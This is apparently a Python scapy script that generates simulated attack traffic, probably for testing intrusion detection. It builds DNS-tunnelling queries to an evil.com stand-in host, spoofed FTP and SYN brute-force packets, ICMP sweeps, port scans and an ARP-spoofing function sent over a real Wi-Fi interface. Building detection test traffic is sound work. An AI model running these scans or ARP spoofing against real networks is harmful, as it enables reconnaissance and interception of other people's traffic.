from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import send, sendp
import base64
import os
import warnings

# Suppress the iface warning — we're sending to loopback so iface has no effect
warnings.filterwarnings("ignore", message=".*iface.*has no effect.*")

DST_IP  = "127.0.0.1"
SRC_IP  = "192.168.1.2"
SRC_MAC = "56:1A:7D:3F:4B:6C"
DST_MAC = "41:1A:7D:3F:4B:6C"

def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
                src_mac=None, dst_mac=None, flags=None, payload=None,
                num_packets=1, iface=None):

    protocol = protocol.upper()

    if protocol == "DNS":
        safe_payload = payload.decode("utf-8").replace(" ", "-") if payload else ""
        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
        pkt = ip \
            / UDP(sport=src_port or 12345, dport=dst_port or 53) \
            / DNS(rd=1, qd=DNSQR(qname=safe_payload))
        send(pkt, count=num_packets, verbose=True)

    elif protocol == "TCP":
        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
        tcp = TCP(
            sport=src_port or 1024,
            dport=dst_port or 80,
            flags=flags or "",
        )
        pkt = ip / tcp
        if payload:
            pkt = pkt / (payload if isinstance(payload, bytes) else payload.encode())
        send([pkt] * num_packets, verbose=False)

    elif protocol == "UDP":
        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
        udp = UDP(sport=src_port or 1024, dport=dst_port or 53)
        pkt = ip / udp / payload if payload else ip / udp
        send([pkt] * num_packets, verbose=False)

    elif protocol == "ICMP":
        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
        send([ip / ICMP()] * num_packets, verbose=False)

    elif protocol == "ARP":
        if not dst_ip:
            raise ValueError("ARP requires dst_ip")
        arp = ARP(pdst=dst_ip)
        if src_ip:  arp.psrc  = src_ip
        if src_mac: arp.hwsrc = src_mac
        eth = Ether(dst=dst_mac or "ff:ff:ff:ff:ff:ff",
                    src=src_mac or SRC_MAC)
        sendp([eth / arp] * num_packets, verbose=False)

    else:
        raise ValueError(f"Unsupported protocol: {protocol}")


def make_tunnel_domain(base_domain="evil.com"):
    raw     = os.urandom(50)
    encoded = base64.b32encode(raw).decode().rstrip("=").lower()
    labels  = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]
    return (".".join(labels) + "." + base_domain).encode()


def send_dns(num_packets=1):
    for _ in range(num_packets):
        payload = make_tunnel_domain()
        send_packet("DNS", DST_IP, SRC_IP, 12345, 53, payload=payload)


def send_ftp(num_packets=1):
    for _ in range(num_packets):
        send_packet("TCP", DST_IP, SRC_IP, 12345, 21,
                    flags="PA", payload="USER admin\r\n")
        send_packet("TCP", DST_IP, SRC_IP, 21, 12345,
                    flags="PA", payload="220 FTP server ready\r\n")


def send_brute_force(dst_port=22, num_attempts=20):
    for i in range(num_attempts):
        send_packet("TCP", DST_IP, SRC_IP,
                    src_port=10000 + i,
                    dst_port=dst_port,
                    flags="S")


def send_icmp_sweep(targets: list[str], num_packets=1):
    for target in targets:
        send_packet("ICMP", target, SRC_IP, num_packets=num_packets)


def send_port_scan(dst_ports: list[int], flags="S"):
    for port in dst_ports:
        send_packet("TCP", DST_IP, SRC_IP,
                    src_port=54321,
                    dst_port=port,
                    flags=flags)
        
def send_arp(target_ip, spoof_ip, spoof_mac, num_packets=1):
    arp = ARP(
        op=2,
        pdst=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=spoof_ip,
        hwsrc=spoof_mac,
    )
    eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=SRC_MAC)
    sendp([eth / arp] * num_packets, iface="Wi-Fi", verbose=True)

def main():
    #send_ftp(20)
    #send_arp("129.21.102.104", "192.168.1.3", "ad:bb:cc:dd:ee:ff", 20)
    send_dns(20)

main()